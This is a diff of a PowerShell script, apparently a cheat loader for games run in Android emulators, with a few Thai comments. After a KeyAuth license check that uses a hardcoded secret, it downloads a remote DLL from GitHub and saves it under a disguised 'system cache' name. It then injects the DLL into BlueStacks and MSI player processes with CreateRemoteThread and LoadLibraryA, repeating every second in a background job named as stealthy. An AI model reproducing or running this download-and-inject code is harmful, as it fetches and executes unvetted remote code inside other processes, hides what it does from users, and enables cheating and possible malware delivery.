@@ -1,6 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# ****************************
+# --- ข้อมูล KeyAuth ---
 $Name    = "Relaxwtf777's Application"
 $OwnerID = "W404AorT6U"
 $Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
@@ -9,7 +9,7 @@ $Version = "1.0"
 function Show-Auth {
     Clear-Host
     Write-Host "==============================" -ForegroundColor Cyan
-    Write-Host "    BASX AI v$Version" -ForegroundColor Cyan
+    Write-Host "    BASX AIMBOT AI v$Version" -ForegroundColor Cyan
     Write-Host "==============================" -ForegroundColor Cyan
     
     $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
@@ -30,15 +30,18 @@ function Show-Auth {
 }
 
 if (Show-Auth) {
-    # 1. ***********************************
     $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
     $tempPath = "$env:TEMP\sys_node_cache.dll"
-    $targetProcesses = @("HD-Player", "BlueStacks", "MSIPlayer", "AndroidProcess")
+    $targetProcesses = @("HD-Player", "BlueStacks", "MSIPlayer")
 
     Write-Host "[*] Downloading System Cache..." -ForegroundColor Yellow
-    (New-Object System.Net.WebClient).DownloadFile($dllUrl, $tempPath)
+    try {
+        (New-Object System.Net.WebClient).DownloadFile($dllUrl, $tempPath)
+    } catch { 
+        Write-Host "[!] Download Failed" -ForegroundColor Red
+        exit 
+    }
 
-    # 2. ****************************
     $Source = @"
     using System;
     using System.Runtime.InteropServices;
@@ -52,9 +55,9 @@ if (Show-Auth) {
         [DllImport("kernel32.dll", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
         [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
         
-        public static bool Inject(string path, string pName) {
+        public static void StartNode(string path, string pName) {
             Process[] target = Process.GetProcessesByName(pName);
-            if (target.Length == 0) return false;
+            if (target.Length == 0) return;
             foreach (var p in target) {
                 IntPtr hProc = OpenProcess(0x001F0FFF, false, p.Id);
                 if (hProc == IntPtr.Zero) continue;
@@ -64,32 +67,34 @@ if (Show-Auth) {
                 IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                 CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
             }
-            return true;
         }
     }
 "@
     Add-Type -TypeDefinition $Source
 
-    # 3. *********************
+    # ส่วนนี้คือ Job ที่จะรันเบื้องหลังเพื่อฉีดซ้ำและดักปุ่ม Home
     $ScriptBlock = {
         param($path, $targets)
         Add-Type -AssemblyName PresentationCore
         while ($true) {
             foreach ($name in $targets) {
-                # ****************************
-                $p = Get-Process $name -ErrorAction SilentlyContinue
-                if ($p) {
-                    # *********************
-                    [NodeHandler]::Inject($path, $name)
-                }
+                [NodeHandler]::StartNode($path, $name)
             }
-
-            # *********************
+            # ถ้ากด Home ให้ล้างไฟล์และหยุด Job
             if ([Windows.Input.Keyboard]::IsKeyDown([Windows.Input.Key]::Home)) {
                 Remove-Item $path -Force -ErrorAction SilentlyContinue
                 break
             }
-            # ****************************
-            Start-Sleep -Seconds 2 
+            Start-Sleep -Seconds 1 # ฉีดซ้ำทุก 1 วินาที
         }
     }
+
+    Start-Job -ScriptBlock $ScriptBlock -ArgumentList $tempPath, $targetProcesses -Name "BasX_Stealth_Job"
+    
+    Write-Host "[+] BasX System: Active (Background)" -ForegroundColor Green
+    Write-Host "[!] Press 'HOME' to Exit & Clean." -ForegroundColor Red
+    Start-Sleep -Seconds 3
+} else {
+    Write-Host "[-] Auth Failed." -ForegroundColor Red
+    Start-Sleep -Seconds 5
+} # ปิดปีกกาตัวสุดท้ายที่หายไปในรูป!
